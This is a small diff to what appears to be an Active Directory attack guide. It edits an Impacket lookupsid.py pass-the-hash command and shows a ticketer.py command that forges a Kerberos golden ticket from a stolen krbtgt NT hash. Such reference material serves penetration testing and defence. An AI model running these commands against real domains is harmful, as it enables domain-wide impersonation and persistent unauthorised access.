@@ -27,7 +27,7 @@ There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for eac
 
 ```bash
 # Find the domain SID
-lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$DC_HOST" 0
 
 # Create the golden ticket (with an RC4 key, i.e. NT hash)
 ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" $USER
